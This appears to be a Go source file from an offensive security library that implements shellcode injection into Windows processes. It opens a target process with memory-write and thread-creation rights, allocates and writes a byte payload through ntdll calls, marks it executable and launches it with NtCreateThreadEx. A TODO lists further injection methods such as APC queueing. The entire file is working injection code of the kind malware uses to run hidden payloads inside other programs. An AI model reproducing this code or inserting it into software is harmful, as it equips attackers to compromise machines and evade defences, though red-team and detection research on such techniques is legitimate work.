//go:build windows
// +build windows

package cmd

import (
	"context"
	"strconv"
	"sync/atomic"
	"time"
	"unsafe"

	"github.com/iDigitalFlame/xmt/util/xerr"
	"golang.org/x/sys/windows"
)

const secThread = windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION |
	windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE |
	windows.PROCESS_VM_READ | windows.PROCESS_TERMINATE |
	windows.PROCESS_DUP_HANDLE | 0x001

var (
	dllNtdll = windows.NewLazySystemDLL("ntdll.dll")

	funcSuspendThread     = dllKernel32.NewProc("SuspendThread")
	funcTerminateThread   = dllKernel32.NewProc("TerminateThread")
	funcGetExitCodeThread = dllKernel32.NewProc("GetExitCodeThread")

	funcNtCreateThreadEx        = dllNtdll.NewProc("NtCreateThreadEx")
	funcNtFreeVirtualMemory     = dllNtdll.NewProc("NtFreeVirtualMemory")
	funcNtWriteVirtualMemory    = dllNtdll.NewProc("NtWriteVirtualMemory")
	funcNtProtectVirtualMemory  = dllNtdll.NewProc("NtProtectVirtualMemory")
	funcNtAllocateVirtualMemory = dllNtdll.NewProc("NtAllocateVirtualMemory")
)

type thread struct {
	ctx              context.Context
	err              error
	cb               func()
	ch               chan finished
	cancel           context.CancelFunc
	filter           *Filter
	hwnd, loc, owner windows.Handle
	exit, cookie     uint32
	s                bool
}

func (t *thread) wait() {
	var (
		x   = make(chan error)
		err error
	)
	go func() {
		x <- wait(t.hwnd)
		close(x)
	}()
	select {
	case err = <-x:
	case <-t.ctx.Done():
	}
	if err != nil {
		t.stopWith(exitStopped, err)
		return
	}
	if err2 := t.ctx.Err(); err2 != nil {
		t.stopWith(exitStopped, err2)
		return
	}
	var r uintptr
	r, _, err = funcGetExitCodeThread.Call(uintptr(t.hwnd), uintptr(unsafe.Pointer(&t.exit)))
	if atomic.StoreUint32(&t.cookie, 2); r == 0 {
		t.stopWith(exitStopped, err)
		return
	}
	if t.exit != 0 {
		t.stopWith(t.exit, &ExitError{Exit: t.exit})
		return
	}
	t.stopWith(t.exit, nil)
}
func (t *thread) close() {
	if t.hwnd == 0 || t.owner == 0 {
		return
	}
	if t.loc > 0 {
		freeMemory(t.owner, t.loc)
	}
	if t.cb != nil {
		t.cb()
	}
	windows.CloseHandle(t.hwnd)
	windows.CloseHandle(t.owner)
	t.hwnd, t.owner, t.loc = 0, 0, 0
}
func (t *thread) kill() error {
	if t.hwnd == 0 {
		return t.err
	}
	t.exit = exitStopped
	if r, _, err := funcTerminateThread.Call(uintptr(t.hwnd), uintptr(exitStopped)); r == 0 {
		return err
	}
	return nil
}
func (t *thread) Pid() uint32 {
	if !t.Running() {
		return 0
	}
	p, _ := windows.GetProcessId(t.owner)
	return p
}
func (t *thread) Wait() error {
	if t.hwnd == 0 {
		return ErrNotStarted
	}
	<-t.ch
	return t.err
}
func (t *thread) Stop() error {
	if t.hwnd == 0 {
		return nil
	}
	return t.stopWith(exitStopped, t.kill())
}
func (t *thread) Running() bool {
	if t.hwnd == 0 {
		return false
	}
	select {
	case <-t.ch:
		return false
	default:
	}
	return true
}
func (t *thread) Resume() error {
	if !t.Running() || t.hwnd == 0 {
		return ErrNotStarted
	}
	_, err := windows.ResumeThread(t.hwnd)
	return err
}
func (t *thread) String() string {
	if t.hwnd == 0 {
		return ""
	}
	return "(" + strconv.FormatUint(uint64(t.hwnd), 16) + ") 0x" +
		strconv.FormatUint(uint64(t.owner), 16) + " -> 0x" + strconv.FormatUint(uint64(t.loc), 16)
}
func (t *thread) Suspend() error {
	if !t.Running() || t.hwnd == 0 {
		return ErrNotStarted
	}
	if r, _, err := funcSuspendThread.Call(uintptr(t.hwnd)); r != 0 {
		return err
	}
	return nil
}
func (t *thread) SetSuspended(s bool) {
	t.s = s
}
func freeMemory(h, a windows.Handle) error {
	var (
		s         uint32
		r, _, err = funcNtFreeVirtualMemory.Call(
			uintptr(h), uintptr(unsafe.Pointer(&a)),
			uintptr(unsafe.Pointer(&s)), windows.MEM_RELEASE,
		)
	)
	if r > 0 {
		return xerr.Wrap("NtFreeVirtualMemory", err)
	}
	return nil
}
func (t *thread) Handle() (uintptr, error) {
	if t.hwnd == 0 {
		return 0, ErrNotStarted
	}
	return uintptr(t.hwnd), nil
}
func (t *thread) ExitCode() (int32, error) {
	if t.hwnd > 0 && t.Running() {
		return 0, ErrStillRunning
	}
	return int32(t.exit), nil
}
func (t *thread) Location() (uintptr, error) {
	if t.hwnd == 0 || t.loc == 0 {
		return 0, ErrNotStarted
	}
	return uintptr(t.loc), nil
}
func (t *thread) stopWith(c uint32, e error) error {
	if !t.Running() {
		return nil
	}
	if atomic.LoadUint32(&t.cookie) != 1 {
		s := t.cookie
		if atomic.StoreUint32(&t.cookie, 1); t.hwnd > 0 && s != 2 {
			t.kill()
		}
		if err := t.ctx.Err(); s != 2 && err != nil && t.exit == 0 {
			t.err, t.exit = err, c
		}
		t.close()
		close(t.ch)
	}
	if t.cancel(); t.err == nil && t.ctx.Err() != nil {
		if e != nil {
			t.err = e
			return e
		}
		return nil
	}
	return t.err
}
func writeMemory(h, a windows.Handle, b []byte) (uint32, error) {
	var (
		s         uint32
		r, _, err = funcNtWriteVirtualMemory.Call(
			uintptr(h), uintptr(a),
			uintptr(unsafe.Pointer(&b[0])),
			uintptr(len(b)),
			uintptr(unsafe.Pointer(&s)),
		)
	)
	if r > 0 {
		return 0, xerr.Wrap("NtWriteVirtualMemory", err)
	}
	return s, nil
}
func protectMemory(h, a windows.Handle, s, p uint32) (uint32, error) {
	if !protectEnable {
		return 0, nil
	}
	var (
		x, v      uint32 = s, 0
		r, _, err        = funcNtProtectVirtualMemory.Call(
			uintptr(h), uintptr(unsafe.Pointer(&a)),
			uintptr(unsafe.Pointer(&x)), uintptr(p),
			uintptr(unsafe.Pointer(&v)),
		)
	)
	if r > 0 {
		return 0, xerr.Wrap("NtProtectVirtualMemory", err)
	}
	return v, nil
}
func createThread(h, a, p windows.Handle, s bool) (windows.Handle, error) {
	// TODO(dij): Add additional injection types
	//            - NtQueueApcThread
	//            - Kernel Table Callback
	f := uintptr(0x0004)
	if s {
		f |= 0x0001
	}
	var (
		t         windows.Handle
		r, _, err = funcNtCreateThreadEx.Call(
			uintptr(unsafe.Pointer(&t)),
			windows.GENERIC_ALL, 0,
			uintptr(h), uintptr(a), uintptr(p),
			f, 0, 0, 0, 0,
		)
	)
	if r > 0 {
		return 0, xerr.Wrap("NtCreateThreadEx", err)
	}
	return t, nil
}
func allocateMemory(h windows.Handle, s, p uint32) (windows.Handle, error) {
	var (
		a         windows.Handle
		x         = s
		r, _, err = funcNtAllocateVirtualMemory.Call(
			uintptr(h), uintptr(unsafe.Pointer(&a)),
			0, uintptr(unsafe.Pointer(&x)),
			windows.MEM_COMMIT, uintptr(p),
		)
	)
	if r > 0 {
		return 0, xerr.Wrap("NtAllocateVirtualMemory", err)
	}
	return a, nil
}
func (t *thread) Start(p windows.Handle, d time.Duration, a windows.Handle, b []byte) error {
	if t.Running() {
		return ErrAlreadyStarted
	}
	if len(b) == 0 {
		return ErrEmptyCommand
	}
	if t.ctx == nil {
		t.ctx = context.Background()
	}
	if d > 0 {
		t.ctx, t.cancel = context.WithTimeout(t.ctx, d)
	} else {
		t.cancel = func() {}
	}
	atomic.StoreUint32(&t.cookie, 0)
	if t.ch, t.owner = make(chan finished), p; t.owner == 0 {
		t.owner = windows.CurrentProcess()
	}
	var err error
	if t.filter != nil && p == 0 {
		if t.owner, err = t.filter.get(secThread, nil); err != nil {
			return t.stopWith(exitStopped, err)
		}
	}
	l := uint32(len(b))
	if t.loc, err = allocateMemory(t.owner, l, windows.PAGE_READWRITE); err != nil {
		return t.stopWith(exitStopped, err)
	}
	if _, err = writeMemory(t.owner, t.loc, b); err != nil {
		return t.stopWith(exitStopped, err)
	}
	if a > 0 {
		protectMemory(t.owner, t.loc, l, windows.PAGE_READONLY)
		if t.hwnd, err = createThread(t.owner, a, t.loc, t.s); err != nil {
			return t.stopWith(exitStopped, err)
		}
	} else {
		protectMemory(t.owner, t.loc, l, windows.PAGE_EXECUTE_READ)
		if t.hwnd, err = createThread(t.owner, t.loc, 0, t.s); err != nil {
			return t.stopWith(exitStopped, err)
		}
	}
	return nil
}
